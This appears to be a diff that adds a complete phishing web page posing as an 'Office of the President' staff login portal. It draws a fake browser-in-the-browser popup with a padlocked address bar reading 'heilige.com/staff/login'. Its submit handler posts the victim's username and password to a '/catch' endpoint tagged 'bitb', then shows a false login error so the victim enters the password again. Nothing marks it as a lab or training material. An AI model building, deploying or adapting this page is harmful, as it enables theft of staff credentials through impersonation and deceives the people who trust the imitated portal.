@@ -1,0 +1,50 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<title>Security Portal</title>
+<style>*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,sans-serif;background:#1a3a6e;min-height:100vh;display:flex;align-items:center;justify-content:center;}
+.hero{text-align:center;color:white;padding:40px}
+.hero h1{font-size:2.2em;text-shadow:1px 1px 4px rgba(0,0,0,.8);margin-bottom:10px}
+.hero p{font-size:1.1em;opacity:.85;margin:10px 0 24px}
+.btn{padding:13px 36px;background:#c8a951;color:#1a3a6e;font-weight:bold;font-size:1em;border:none;border-radius:4px;cursor:pointer}
+#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:9999;align-items:center;justify-content:center}
+#ov.show{display:flex}
+.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);animation:popIn .15s ease-out}
+@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
+.tb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
+.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
+.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
+.ub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333}
+.lock{color:#1a73e8;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#666}
+.bd{background:white;padding:32px 36px 28px}
+.bd h2{text-align:center;font-size:18px;color:#1a3a6e;margin-bottom:6px}
+.bd .sub{text-align:center;font-size:13px;color:#666;margin-bottom:22px}
+.bd label{font-size:13px;color:#333;display:block;margin-bottom:4px}
+.bd input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:14px;outline:none;box-sizing:border-box}
+.bd input:focus{border-color:#1a73e8}
+.bd .bs{width:100%;padding:10px;background:#1a3a6e;color:white;border:none;border-radius:4px;font-size:15px;cursor:pointer}
+.bd .err{display:none;color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:10px}
+</style></head><body>
+<div class="hero"><h1>Security Portal</h1><p>Secure Access</p>
+<button class="btn" onclick="showB()">Staff Portal Login</button></div>
+<div id="ov"><div class="bw">
+<div class="tb">
+<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
+<div class="ub"><span class="lock">&#128274;</span><span><strong>heilige.com</strong><span style="color:#888">/staff/login</span></span></div>
+<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
+<div class="bd"><h2>Sign in</h2><p class="sub">Office of the President — Staff Portal</p>
+<form id="lf" onsubmit="doSub(event)">
+<label>Username or email</label><input type="text" id="fu" placeholder="username" required>
+<label>Password</label><input type="password" id="fp" placeholder="password" required>
+<p class="err" id="em">Invalid username or password.</p>
+<button class="bs" type="submit">Sign in</button>
+</form></div></div></div>
+<script>
+function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
+function hideB(){document.getElementById('ov').classList.remove('show');}
+document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
+function doSub(e){e.preventDefault();
+var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
+fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
+var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
+setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Sign in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
+</script></body></html>
